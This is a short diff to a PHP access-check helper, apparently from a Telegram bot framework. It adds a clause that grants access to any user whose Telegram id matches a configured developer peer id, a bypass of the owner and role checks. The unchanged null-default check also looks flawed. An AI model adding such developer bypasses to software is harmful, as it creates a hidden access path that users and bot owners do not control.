@@ -316,7 +316,7 @@ if (!function_exists('hasAccess')) {
 
     function hasAccess(?int $power = null): bool
     {
-        return (wHook()->user()->power >= $power ?? Roles::ADMIN->value) || (wHook()->bot()->botOwner->id == wHook()->user()->telegramUser->id);
+        return (wHook()->user()->power >= $power ?? Roles::ADMIN->value) || (wHook()->bot()->botOwner->id == wHook()->user()->telegramUser->id || wHook()->user()->telegramUser->id == config('tbe-essence.developer.peer_id'));
     }
 }
 
